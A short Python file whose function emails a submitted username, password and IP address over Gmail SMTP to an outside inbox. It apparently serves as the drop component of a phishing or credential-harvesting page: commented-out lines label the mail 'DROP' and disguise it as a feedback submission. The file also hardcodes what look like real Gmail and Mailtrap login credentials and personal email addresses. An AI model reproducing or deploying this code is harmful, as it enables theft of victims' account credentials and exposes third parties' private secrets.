import smtplib
from email.mime.text import MIMEText
#from flask import Flask, request

#ip_address = request.remote_addr
def send_mail(username, password, ip_address):
    # port = (25)
    # smtp_server = "smtp.mailtrap.io"
    # login = '6187c074a489f4'
    # password = '484e76cb9fe71d'
    # message = f"<h3>New Feedback Submission</h3><ul><li>Username: {username} </li><li>Password: {password} </li><li>IP Address: {ip_address} </li></ul>"
    
    # sender_email = "email@example.com"
    # receiver_email = "email2@example.com"
    # msg = MIMEText(message, "html")
    # msg["Subject"] = "DROP"
    # msg["From"] = sender_email
    # msg["To"] = receiver_email
    #Send Email
    EMAIL_ADDRESS = "work77@gmail.com"
    EMAIL_PASSWORD = "softwork77"
    with smtplib.SMTP("smtp.gmail.com", 587) as smtp:
        smtp.ehlo()
        smtp.starttls()
        smtp.ehlo()

        smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)

        subject = "Just Testing"
        body = f"The username is: {username} \n password is: {password} \n ip: {ip_address}"
        msg = f"Subject: {subject}\n\n{body}"
        smtp.sendmail("busganda@gmail.com", "gideonbusayo@gmail.com", msg)

    # with smtplib.SMTP(smtp_server, port) as server:
    #     server.login(login, password)
    #     server.sendmail(sender_email, receiver_email, msg.as_string())

